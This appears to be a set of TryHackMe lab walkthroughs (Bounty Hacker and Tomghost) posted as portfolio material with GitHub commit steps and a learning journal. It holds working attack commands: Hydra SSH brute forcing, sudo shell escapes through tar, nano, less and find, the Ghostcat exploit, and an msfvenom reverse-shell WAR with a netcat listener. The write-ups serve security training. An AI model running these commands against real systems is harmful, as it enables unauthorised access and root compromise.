FTP Enumeration
Anonymous FTP Login
bash
ftp 10.10.XXX.XXX
Username: anonymous
Password: anonymous

List Files:

bash
ls -la
Found:

text
-rw-rw-r-- 1 ftp ftp 418 Jun 7  2020 locks.txt
-rw-rw-r-- 1 ftp ftp 1896 Jun 7  2020 task.txt
Downloading Files
bash
get locks.txt
get task.txt
task.txt Contents
text
Instructions for the bounty hacker:
- Check the FTP server for files
- There are 3 tasks to complete
- Contact the security team for credentials
locks.txt Contents
text
r1cky
b3tt3r
th4n
m3
h4ck3r
💡 Discovery: Found a list of usernames/words that might be passwords!

🌐 Web Enumeration
Website Check
Navigating to http://10.10.XXX.XXX shows a simple page.

Directory Brute Force
bash
gobuster dir -u http://10.10.XXX.XXX -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
Results:

text
/index.html (Status: 200)
/images (Status: 301)
/admin (Status: 301)
/robots.txt (Status: 200)
/portal (Status: 301)
/assets (Status: 301)
Admin Directory
Navigating to /admin shows a login page.

Locks.txt as Password List
Use the locks.txt file as a password list for SSH brute force!

🔑 Gaining Access
Hydra SSH Brute Force
hydra -l lin -P locks.txt ssh://10.10.XXX.XXX
Results:

text
[22][ssh] host: 10.10.XXX.XXX   login: lin   password: ***************
🎯 Credentials Found!

Username: lin

Password: ***************

SSH Access
bash
ssh lin@10.10.XXX.XXX
Success! We're in as user lin!

bash
whoami
Output: lin

Finding User Flag
bash
ls -la
cat user.txt
User Flag: ***************

🚀 Privilege Escalation
Sudo Check
bash
sudo -l
Output:

text
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
    (root) /usr/bin/nano
    (root) /usr/bin/less
💡 This is huge! We can run these 3 commands as root without a password!

Escalating to Root
Option 1: Using /bin/tar

bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
This gives us a root shell!

Option 2: Using /usr/bin/nano

bash
sudo nano
Within nano:

Press Ctrl+R, then Ctrl+X

Type: reset; sh 1>&0 2>&0

This gives a root shell!

Option 3: Using /usr/bin/less

bash
sudo less /var/log/syslog
Within less:

Type: !/bin/sh

This spawns a root shell!

bash
whoami
Output: root

Finding Root Flag
bash
cd /root
cat root.txt
Root Flag: ***************

🏆 Flags Captured
Flag	Location	Value
User Flag	/home/lin/user.txt	***************
Root Flag	/root/root.txt	***************
🧠 Lessons Learned
Key Takeaways:
FTP is Often Misconfigured

Anonymous FTP often exists

Check for sensitive files in FTP servers

Wordlists are Powerful

locks.txt contained a wordlist

Use these for brute forcing credentials

SSH Brute Forcing Works

Hydra is perfect for this

Use known username and wordlist

Sudo Misconfigurations Lead to Root

Check sudo -l immediately

Look for commands you can run as root

Multiple Paths to Root

tar, nano, less all can spawn shells

Know common escalation techniques

Document Everything

Write detailed walkthroughs

Save commands for future reference

🛠️ Tools Used
Tool	Purpose
Nmap	Port scanning and service enumeration
FTP	File retrieval from anonymous FTP
Gobuster	Directory brute forcing
Hydra	SSH brute force attack
SSH	Secure shell access to target
Sudo	Privilege escalation
📝 Methodology Summary
text
1. Reconnaissance
   └── Nmap port scan
   
2. FTP Enumeration
   ├── Anonymous FTP login
   ├── Download locks.txt and task.txt
   └── Identify wordlist
   
3. Web Enumeration
   ├── Directory brute forcing
   └── Identify admin panel
   
4. Initial Access
   ├── Hydra SSH brute force
   └── SSH login as lin
   
5. Privilege Escalation
   ├── Sudo commands available
   └── Root via tar/nano/less
   
6. Flags Collection
   ├── User flag
   └── Root flag
   Important Security Notes
Always have permission before scanning targets

Use CTF platforms for safe/legal practice

These techniques are for authorized testing only

Report vulnerabilities responsibly

🔗 Connect With Me
GitHub: github.com/Kezdjaggs

LinkedIn: linkedin.com/in/kehinde-jagunna-7b063a319

Certifications: CEH, Security+

CTF Walkthrough Completed! 🏴
Date: August 20, 2026
Author: Kehinde Jaggs - Certified Ethical Hacker (CEH)

"In the world of cybersecurity, curiosity is your greatest weapon."

text

4. **Commit message:** `🏴 Added TryHackMe Bounty Hacker CTF walkthrough`
5. Click **"Commit new file"**

---

## 📝 ADD CTF #3: TryHackMe "Tomghost"

1. Click **"Add file"** → **"Create new file"**
2. **Name it:** `TryHackMe-Tomghost.md`
3. **Paste this:**

```markdown
# 🏴 TryHackMe: Tomghost - Complete Walkthrough

**Date:** August 20, 2026  
**Author:** Kehinde Jaggs (CEH)  
**Difficulty:** Easy  
**Machine IP:** 10.10.XXX.XXX  
**Room Link:** [TryHackMe Tomghost](https://tryhackme.com/room/tomghost)

---

## 📋 Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Web Enumeration](#web-enumeration)
3. [Exploitation](#exploitation)
4. [Privilege Escalation](#privilege-escalation)
5. [Flags Captured](#flags-captured)
6. [Lessons Learned](#lessons-learned)

---

## 🔍 Reconnaissance

### Nmap Scan
```bash
nmap -sV -sC -T4 -p- 10.10.XXX.XXX
Results:

text
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30
Key Findings:

SSH on port 22

AJP on port 8009

Tomcat on port 8080

🌐 Web Enumeration
Tomcat Web Interface
Navigating to http://10.10.XXX.XXX:8080 shows:

https://via.placeholder.com/600x300?text=Tomcat+Homepage

Tomcat Version: 9.0.30

AJP Protocol
AJP (Apache Jserv Protocol) on port 8009 can be exploited for:

💡 AJP File Read/Inclusion vulnerability (CVE-2020-1938)

🔧 Exploitation
Using AJP Ghostcat Exploit
Search for exploit:

bash
searchsploit tomcat ajp
Found: Ghostcat (CVE-2020-1938)

Using the exploit:

bash
python3 exploit.py 10.10.XXX.XXX 8009
Reading web.xml:

bash
python3 exploit.py 10.10.XXX.XXX 8009 /WEB-INF/web.xml
Found in web.xml:

text
<user>
  <username>tomcat</username>
  <password>***************</password>
  <role>manager-gui</role>
</user>
🎯 Credentials Found!

Username: tomcat

Password: ***************

Tomcat Manager Access
Navigating to /manager and logging in:

https://via.placeholder.com/600x300?text=Tomcat+Manager

Now we can deploy WAR files!

🚀 Gaining Access
Creating a Reverse Shell WAR
Step 1: Generate WAR file

bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f war -o shell.war
Step 2: Upload WAR
Go to Tomcat Manager → Deploy → Upload shell.war

Step 3: Start Netcat Listener

bash
nc -lvnp 4444
Step 4: Trigger Shell

text
curl http://10.10.XXX.XXX:8080/shell/
BOOM! We have a reverse shell!

bash
whoami
Output: tomcat

🔓 Privilege Escalation
System Enumeration
bash
sudo -l
Output:

text
User tomcat may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/zip
    (root) NOPASSWD: /usr/bin/unzip
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/grep
💡 Multiple commands available for privilege escalation!

Escalating with /usr/bin/find
bash
sudo find . -exec /bin/sh \; -quit
BOOM! We are now root!

bash
whoami
Output: root

Finding the Flags
User Flag:

bash
cd /home
ls -la
cat /home/tomcat/user.txt
User Flag: ***************

Root Flag:

bash
cd /root
cat root.txt
Root Flag: ***************

🏆 Flags Captured
Flag	Location	Value
User Flag	/home/tomcat/user.txt	***************
Root Flag	/root/root.txt	***************
🧠 Lessons Learned
Key Takeaways:
AJP is a Weak Point

Ghostcat vulnerability is serious

Always check for port 8009

Tomcat Manager is Dangerous

Weak credentials lead to WAR deployment

Always change default passwords

Searchsploit is a Must-Know

Find exploits quickly

Always check for known vulnerabilities

WAR Deployment is a Common Attack

JSP shells are effective

MSFVenom is your friend

Sudo Misconfigurations Again

Check sudo -l immediately

find command is a known privesc vector

Multiple Paths to Root

Always check all sudo commands

Know the exploit for each

🛠️ Tools Used
Tool	Purpose
Nmap	Port scanning
Searchsploit	Find exploits
Python	Running Ghostcat exploit
MSFVenom	Generate WAR shell
Netcat	Reverse shell listener
Sudo	Privilege escalation
📝 Methodology Summary
text
1. Reconnaissance
   └── Nmap port scan (found AJP and Tomcat)
   
2. Exploitation
   ├── Ghostcat exploit (CVE-2020-1938)
   ├── Read web.xml for credentials
   ├── Access Tomcat Manager
   └── Deploy WAR shell
   
3. Privilege Escalation
   ├── Sudo commands available
   └── Find command execution
   
4. Flags Collection
   ├── User flag
   └── Root flag
⚠️ Important Security Notes
Always have permission before scanning targets

Ghostcat vulnerability is critical

Tomcat managers should be secured properly

Always change default credentials

🔗 Connect With Me
GitHub: github.com/Kezdjaggs

LinkedIn: linkedin.com/in/kehinde-jagunna-7b063a319

Certifications: CEH, Security+

CTF Walkthrough Completed! 🏴
Date: August 20, 2026
Author: Kehinde Jaggs - Certified Ethical Hacker (CEH)

"The best way to learn is by doing. The best way to prove is by documenting."

text

4. **Commit message:** `🏴 Added TryHackMe Tomghost CTF walkthrough`
5. Click **"Commit new file"**

---

## 📝 UPDATE YOUR JOURNAL

Go to `daily-learning-journal` and create `Day-07-August-21-2026.md`:

```markdown
# 📅 Day 7 - August 21, 2026

## 🎯 Today's Goal
Complete multiple CTF walkthroughs for my portfolio

## 🛠️ What I Did
- ✅ Completed TryHackMe "Bounty Hacker"
- ✅ Completed TryHackMe "Tomghost"
- ✅ Wrote detailed walkthroughs for both
- ✅ Documented methodology and commands
- ✅ Added lessons learned for each

## 🧠 What I Learned

### Bounty Hacker:
- Anonymous FTP often contains sensitive files
- Wordlists found on FTP can be used for brute forcing
- Hydra is essential for SSH brute force
- Sudo misconfigurations lead to root (tar, nano, less)

### Tomghost:
- AJP port 8009 is vulnerable (Ghostcat CVE-2020-1938)
- Tomcat Manager should be secured
- WAR deployment is a common attack vector
- Find command can be exploited for privilege escalation

## 📊 CTF Portfolio So Far
1. ✅ Pickle Rick
2. ✅ Bounty Hacker
3. ✅ Tomghost

